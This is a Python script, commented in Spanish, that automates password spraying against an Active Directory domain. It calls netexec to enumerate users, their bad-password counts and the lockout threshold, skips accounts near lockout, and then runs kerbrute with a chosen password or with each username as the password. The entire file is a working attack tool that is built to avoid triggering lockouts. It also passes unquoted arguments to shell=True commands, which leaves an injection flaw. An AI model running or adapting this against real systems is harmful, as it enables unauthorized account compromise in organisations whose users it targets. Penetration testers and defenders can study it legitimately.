#!/usr/bin/env python3
import argparse
import subprocess
import tempfile
import re
import os
import sys

def get_netexec_users(dc_ip, username, password, domain):
    """
    Ejecuta netexec para obtener la lista de usuarios y su BadPW.
    Se utiliza una cadena de comandos con grep y awk para filtrar la salida.
    """
    cmd = (
        f"nxc smb {dc_ip} -u {username} -p {password} -d {domain} --users "
        "| grep -v '<never>' | awk '{print $5,$8}' | grep -v ']' | grep -v '-Username- Set-'"
    )
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        print("Error ejecutando netexec para obtener usuarios:", e, file=sys.stderr)
        sys.exit(1)

    users = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        user = parts[0]
        try:
            badpw = int(parts[1])
        except ValueError:
            continue
        users.append((user, badpw))
    return users

def get_account_lockout_threshold(dc_ip, username, password, domain):
    """
    Ejecuta netexec para extraer el account lockout threshold del dominio.
    Se asume que la salida contiene una línea similar a:
      "Account lockout threshold: 5"
    """
    cmd = f"nxc smb {dc_ip} -u {username} -p {password} -d {domain} --pass-pol"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        print("Error ejecutando netexec para obtener la política de lockout:", e, file=sys.stderr)
        sys.exit(1)
    
    match = re.search(r'(?i)Account\s+Lockout\s+Threshold\s*:\s*(\d+)', result.stdout)
    if match:
        return int(match.group(1))
    else:
        print("No se pudo obtener el Account lockout threshold del dominio.", file=sys.stderr)
        sys.exit(1)

def read_enabled_users(enabled_users_file):
    """
    Lee desde un archivo la lista de usuarios habilitados.
    Se espera que el archivo contenga un usuario por línea.
    """
    try:
        with open(enabled_users_file, "r") as f:
            enabled_users = { line.strip() for line in f if line.strip() }
        return enabled_users
    except Exception as e:
        print("Error leyendo la lista de usuarios habilitados:", e, file=sys.stderr)
        sys.exit(1)

def write_temp_users_file(users):
    """
    Escribe en un archivo temporal la lista de usuarios elegibles para spraying.
    """
    tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
    for user in users:
        tmp.write(user + "\n")
    tmp.close()
    return tmp.name

def run_kerbrute(domain, dc_ip, temp_users_file, spray_password, use_user_as_pass=False, output_dir=None):
    """
    Ejecuta kerbrute passwordspray usando la lista de usuarios.
    Si use_user_as_pass es True se añade el parámetro --user-as-pass en vez de la contraseña.
    Si se especifica output_dir, se añade el parámetro -o con el directorio de salida.
    """
    if use_user_as_pass:
        cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, "--user-as-pass", temp_users_file]
    else:
        cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, temp_users_file, spray_password]
    
    if output_dir:
        cmd.extend(["-o", output_dir])
        
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print("Error ejecutando kerbrute:", e, file=sys.stderr)
        print(e.stdout)
        print(e.stderr)
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Script para realizar password spraying con kerbrute. "
                    "Si se provee autenticación (-ul y -pl) se obtiene la información del dominio (BadPW, Account Lockout Threshold) "
                    "y se filtran los usuarios; en caso contrario, se usa directamente la lista de usuarios proporcionada."
    )
    # Parámetros de autenticación para netexec (no obligatorios)
    parser.add_argument("-ul", help="Username para netexec (si se omite, no se obtiene información del dominio)")
    parser.add_argument("-pl", help="Password para netexec (si se omite, no se obtiene información del dominio)")
    parser.add_argument("-d", required=True, help="Dominio (usado para netexec)")
    parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    parser.add_argument("-t", type=int, default=0,
                        help="Threshold seguro: mínimo número de intentos restantes para realizar spray (solo se utiliza si se dispone de autenticación)")
    parser.add_argument("-u", required=True,
                        help="Ruta a la lista de usuarios habilitados del dominio")
    parser.add_argument("-p", help="Password para realizar el password spraying (kerbrute)")
    # Nuevo parámetro opcional para el dominio a utilizar en kerbrute
    parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute. Si se especifica, se usa en kerbrute en lugar del dominio de -d.")
    # Nuevo parámetro opcional para el directorio de salida
    parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")

    # Opciones mutuamente excluyentes para --user-as-pass
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--user-as-pass-low", action="store_true",
                       help="Utilizar --user-as-pass con usuario en minúsculas")
    group.add_argument("--user-as-pass-up", action="store_true",
                       help="Utilizar --user-as-pass con usuario con primera letra en mayúsculas")
    
    args = parser.parse_args()

    # Verificamos que se especifique el método de spraying (contraseña fija o user-as-pass)
    if not args.p and not (args.user_as_pass_low or args.user_as_pass_up):
        parser.error("Debe especificar una contraseña de spray con -p o una opción --user-as-pass (--user-as-pass-low o --user-as-pass-up)")

    if args.ul and args.pl:
        print("[*] Obteniendo la lista de usuarios y su BadPW con netexec...")
        netexec_users = get_netexec_users(args.dc_ip, args.ul, args.pl, args.d)
        if not netexec_users:
            print("No se obtuvieron usuarios de netexec.", file=sys.stderr)
            sys.exit(1)

        print("[*] Leyendo lista de usuarios habilitados...")
        enabled_users = read_enabled_users(args.u)

        filtered_users = [(user, badpw) for user, badpw in netexec_users if user in enabled_users]
        if not filtered_users:
            print("No hay usuarios habilitados en la lista de netexec.", file=sys.stderr)
            sys.exit(1)

        print("[*] Obteniendo Account lockout threshold del dominio...")
        account_threshold = get_account_lockout_threshold(args.dc_ip, args.ul, args.pl, args.d)
        print(f"[*] Account lockout threshold obtenido: {account_threshold}")

        eligible_users = []
        for user, badpw in filtered_users:
            remaining = account_threshold - badpw
            if remaining > args.t:
                eligible_users.append(user)
            else:
                print(f"[-] Usuario {user} no es elegible para spray. BadPW: {badpw}, intentos restantes: {remaining}")
        if not eligible_users:
            print("No hay usuarios elegibles para password spraying según el threshold seguro.", file=sys.stderr)
            sys.exit(0)
    else:
        print("[*] No se proporcionó autenticación para netexec, se usará la lista de usuarios directamente.")
        eligible_users = list(read_enabled_users(args.u))
        if not eligible_users:
            print("La lista de usuarios proporcionada está vacía.", file=sys.stderr)
            sys.exit(1)

    print("[*] Usuarios elegibles para password spraying:")
    for user in eligible_users:
        print(f" - {user}")

    use_user_as_pass = False
    if args.user_as_pass_low:
        eligible_users = [user.lower() for user in eligible_users]
        use_user_as_pass = True
    elif args.user_as_pass_up:
        eligible_users = [user.capitalize() for user in eligible_users]
        use_user_as_pass = True

    temp_file = write_temp_users_file(eligible_users)
    print(f"[*] Archivo temporal generado: {temp_file}")

    kerbrute_domain = args.target_domain if args.target_domain else args.d

    print("[*] Ejecutando kerbrute passwordspray...")
    run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, args.p, use_user_as_pass=use_user_as_pass, output_dir=args.output)

    os.remove(temp_file)
    print("[*] Proceso completado.")

if __name__ == "__main__":
    main()